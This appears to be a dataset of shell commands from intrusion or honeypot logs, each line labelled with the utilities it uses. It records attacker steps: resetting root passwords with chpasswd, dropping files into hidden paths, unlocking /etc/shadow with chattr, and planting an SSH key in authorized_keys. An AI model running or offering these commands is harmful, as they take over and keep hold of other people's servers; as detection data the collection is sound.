message
" cat /proc/cpuinfo | grep name | wc -l,Used utilities:;cat grep wc<|endoftext|>"
" echo  root Linux@abc  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:DDumME3r9Lyi |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root $56RtyFghVbn  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:PgpsbOJQ5Uyv |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root mulesystems  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:fBmWbyeiUl0o |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root seguranca24123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:TQOTDXOGetVG |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 123qwertz  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:JtvhmkV02XVY |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root misanthrope  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Ui1rxuNv1wfe |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root demoadmin  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  ivn$$w0rk nBAo1JioTgpc8 nBAo1JioTgpc8 |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  ivn$$w0rk nBAo1JioTgpc8 nBAo1JioTgpc8 n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin ivn$$w0rk  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:jGqb7lwrRqwc |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root chemical  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:uAQ86eVkl4iW |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Hansen  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:21XWARBleZ8Q |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1234mima  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:FblYI3IMeI5w |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root piaoliang  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:H6pKbENUHW7h |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root lujunn352352  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" cat /proc/mounts|  YLTDL,Used utilities:;cat YLTDL<|endoftext|>"
" cd /dev/shm| cat .s || cp /bin/echo .s|  YLTDL,Used utilities:;cd cat  cp YLTDL<|endoftext|>"
" tftp| wget|  YLTDL,Used utilities:;tftp wget YLTDL<|endoftext|>"
"  YLTDL,Used utilities:;YLTDL<|endoftext|>"
" echo  root:9e3zY2cNxHsx |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root hanxing  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:GQn07sT1uJsD |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root poonam  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:P0bpFwEjeZCf |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root onelove  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  justin nlOzMqdz7MdvY nlOzMqdz7MdvY |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  justin nlOzMqdz7MdvY nlOzMqdz7MdvY n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin justin  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:MxE6ui3yRjmK |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root unite  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:vDTqZRq7uRIj |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root sny  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:NWdrOPSlnBPi |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root long197  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:IBZXs8SsX4Xj |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root server!@#123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:wynOYIktQbaZ |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root !Q@W#E$R%T6  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:m2eNDRxYiJIq |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root wwwg  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:8idLDjCr64FB |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zxcvb  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:y0RcMLrpuPtS |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root qq789  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:7XX3AYJuOBcn |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root mri123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:VgbiDGZGHBzA |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root adonis  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:ruM8hjsuiWJe |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root yaonina0576  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:rXJfVeoMaw8j |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root herewith  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:FkZeDuTEIBrv |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1qaz2wsx123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:k9kkwgmZsAuM |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root manana  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:QJqPGBfHzdff |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root P4SSW0RD@2020  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:IcArTCY5ORw9 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root xiazheng  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:W3tKZ3NJEhf8 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zhanqwe123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:O4oYfoAdzRzw |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Hu  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Amv834I9SlSY |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root sp1234  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:AnEokBWGrkMt |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root private  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:WV6b6zTVRHi1 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root n0th1n9  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Qf2kiRTjA4oo |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root:KFnUP9OPafqh |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Winter@123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:V4cUq5fAHPat |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root:y4s7C4NDP3WQ |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root:6TaprQDQMT76 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root percy  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:yUJJPI0sX1rK |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root !qaz2wsx123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  login ngOXctn3l6z5p ngOXctn3l6z5p |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  login ngOXctn3l6z5p ngOXctn3l6z5p n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin login  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  qwer1234!@#$ nE1bkBwvFlY2d nE1bkBwvFlY2d |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  qwer1234!@#$ nE1bkBwvFlY2d nE1bkBwvFlY2d n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin qwer1234!@#$  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:xYcUjKqL5Mgu |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Anton123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:A7wfn5bBzzzs |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Ur98%4ty$@  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:6RgrdImEzlKH |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Huawei12#$g  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:WOQY1QPgDecj |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root marrucci  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:CZuJ1eUIovWl |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root %^&TYUGHJ  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Gd1gN86ImOuz |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root kritika  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:g8NrIm4Mvl8T |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root lavida  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:6v7a3q9ZO44U |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root heap  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:0Tl4kPZ3yda3 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root vivienruby  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  create ndK95qF8jXAPA ndK95qF8jXAPA |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  create ndK95qF8jXAPA ndK95qF8jXAPA n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin create  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:x9aihle9sVWT |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root henanyidong  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:nsgpKZoy90Dx |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root wanglu  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  cocalitro njDoAaueWoK1N njDoAaueWoK1N |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  cocalitro njDoAaueWoK1N njDoAaueWoK1N n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin cocalitro  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:jnIcawjdxQyz |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root thine  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Lks6N9yAbBMG |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root SaoPaolo_123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  NWHbeheer123 nQMSKqIGB9LHm nQMSKqIGB9LHm |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  NWHbeheer123 nQMSKqIGB9LHm nQMSKqIGB9LHm n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin NWHbeheer123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:QzIqeBOTqkwW |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Admin##33  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:hOcDh1xFBFdz |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root ASD  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  p4ssw0rd nkuLm4APU77FV nkuLm4APU77FV |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  p4ssw0rd nkuLm4APU77FV nkuLm4APU77FV n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin p4ssw0rd  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:4zfjkuiU47oU |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root rtf  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  krd9em8w nHwJEXtFEluDW nHwJEXtFEluDW |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  krd9em8w nHwJEXtFEluDW nHwJEXtFEluDW n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin krd9em8w  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:a1dJ9QgPGdUL |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root youth  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:JjZsys5L6tov |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1234QwerAsdfZxcv  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:L7ySpGyIUEpN |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1475369  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:23K7KqNblH4O |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root mfkgakg  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:5cSbqOOEy7wd |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root protel  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:wJwSmDMwYmM8 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Management1@3  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:PMyGr3RQ0fxm |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root whiterabbit  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:DKy7bP0d02KB |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zhaomingwei123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:5c4wKTCjMO24 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root sctbc123445789  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Tn30KTykT7jP |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root deltaforce  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:XNkXbHdKv1cq |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root P@s5w0rd12  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:a9GSDuot172V |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Best@123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:JyYMpJNESb3V |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root cn1230  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:BE6wDIubbvO9 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 123uytrew  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:sadNTth9StcJ |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root vector  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:8abwG3bV6cw9 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Baiser  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:B5vntsZaINuU |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root sadam  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:0Mol1C28XWuw |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 10jqka!@#  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Ka6LJYqn3GlQ |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root leier119  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:5Bx8zfdo74Io |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Alpine  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:HvUK3aKwuXh9 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root !QAZ2wsx3edc$rfv  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:pHnlJTTMujN2 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Jelszo@12345  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:P8Vd1v8TlIGi |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root fabriceg  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:69ngFf0BhnD3 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root yangxu123yangxu  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  Aa789 nHvNjDswWs4IT nHvNjDswWs4IT |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  Aa789 nHvNjDswWs4IT nHvNjDswWs4IT n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin Aa789  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" cat /proc/mounts|  ZEVNX,Used utilities:;cat ZEVNX<|endoftext|>"
" cd /dev/shm| cat .s || cp /bin/echo .s|  ZEVNX,Used utilities:;cd cat  cp ZEVNX<|endoftext|>"
" tftp| wget|  ZEVNX,Used utilities:;tftp wget ZEVNX<|endoftext|>"
"  ZEVNX,Used utilities:;ZEVNX<|endoftext|>"
" echo  root:6Ig1aXrSKxKT |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root pass@1234  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:KzjliEqxOo7R |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root gide  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:YDDsPKv9hyAA |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root kbp  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:TSUETSBGTuZg |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zingaro  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:87xCyEVq0yMU |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root hztest0105  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:sFkJ0zHDZ12j |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 123g  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:0yJIkIKidhb6 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1qaz@WSX3edc  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:f7Prfuqyps7j |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root greater  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:m21IhLch7gJu |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zhangleiaiwangyu  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:sN1LIOnReG8a |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root abc@1  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:TB5Y8P29a2DQ |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Www1234  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:cCFmCelfFVFV |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root vitiate  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:PzncrzbmQqgC |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root gigabytea  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:pXmr5zLfhuoo |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root passwordabc!@#  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:mIQASRLtIZFO |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root saunter  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  COadmin123 nUNVVTqGHNSXW nUNVVTqGHNSXW |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  COadmin123 nUNVVTqGHNSXW nUNVVTqGHNSXW n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin COadmin123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:46eoZuc7NIyx |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root dhiara  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  qwerty nHzfDIL7YLxJk nHzfDIL7YLxJk |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  qwerty nHzfDIL7YLxJk nHzfDIL7YLxJk n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin qwerty  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:N8xfRtVUVdow |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root twisted  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:CslH7VdDLhHF |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root amanda  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:JfNpwAT9GSzK |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root HUAWEI!@#  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:0ry7QHOrIivc |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root yong  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:tAOKr2cYl7Y0 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root !Pa$$word  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:7tnnoEbKTVrV |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root usa  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  hack n5eQDipXXYnaP n5eQDipXXYnaP |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  hack n5eQDipXXYnaP n5eQDipXXYnaP n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin hack  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:cKdYsxRdeo9D |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root faeces  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:q9LZlXhc0690 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Greensboro  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:OAq2bJLllqdV |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root gangsters  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:mcR4eeZqg0i8 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1qaz0plm  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:ajvRF1vklW6w |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root P@$$wort!qaz  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" scp -t ~/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;scp<|endoftext|>"
"  ~/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;~/pdrgo245dybnhe14bzkhtrec2p<|endoftext|>"
"  rm -f ~/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;rm<|endoftext|>"
"  chattr -i -a ~/.dhpcd,Used utilities:;chattr<|endoftext|>"
"  rm -f ~/.dhpcd,Used utilities:;rm<|endoftext|>"
"  rmdir ~/.dhpcd,Used utilities:;rmdir<|endoftext|>"
" scp -t ~/.dhpcd,Used utilities:;scp<|endoftext|>"
"  ~/.dhpcd,Used utilities:;~/.dhpcd<|endoftext|>"
"  echo ~,Used utilities:;echo<|endoftext|>"
"  chattr -i -a /etc/shadow,Used utilities:;chattr<|endoftext|>"
"  passwd,Used utilities:;passwd<|endoftext|>"
"  passwd test,Used utilities:;passwd<|endoftext|>"
"  passwd oracle,Used utilities:;passwd<|endoftext|>"
"  passwd test1,Used utilities:;passwd<|endoftext|>"
"  chattr +a /etc/shadow,Used utilities:;chattr<|endoftext|>"
"  mkdir -p ~/.ssh,Used utilities:;mkdir<|endoftext|>"
"  chmod 700 ~/.ssh,Used utilities:;chmod<|endoftext|>"
"  grep  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH  ~/.ssh/authorized_keys,Used utilities:;grep<|endoftext|>"
